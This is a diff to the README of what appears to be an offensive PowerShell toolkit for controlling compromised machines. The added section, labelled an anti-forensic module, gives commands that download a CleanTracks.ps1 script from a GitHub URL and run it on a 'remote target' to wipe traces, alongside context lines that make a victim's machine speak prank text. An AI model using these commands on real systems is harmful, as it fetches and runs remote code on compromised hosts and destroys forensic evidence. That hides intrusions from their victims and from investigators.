@@ -170,6 +170,16 @@ $SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI 
 Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synthesis.SpeechSynthesizer;$SpeakObect.Volume = 95;$SpeakObect.Rate = -4;$SpeakObect.Speak($SPEAKME)
 ```
 
+<br />
+
+#### Clean remote target artifacts {anti-forensic module}
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1" -OutFile "CleanTracks.ps1"
+powershell -file "CleanTracks.ps1 -CleanTracks Clear -verb true"
+```
+**remark:** <b><i>cleantracks.ps1</b></i> will run attached to <b><i>papacat</b></i> process {client} so.. its advice to wait one minute for module to finish working.
+![w3](https://github.com/r00t-3xp10it/redpill/assets/23490060/061dd192-2b18-4fc4-9077-a58cf086dde3)
+
 ---
 
 <br /><br />
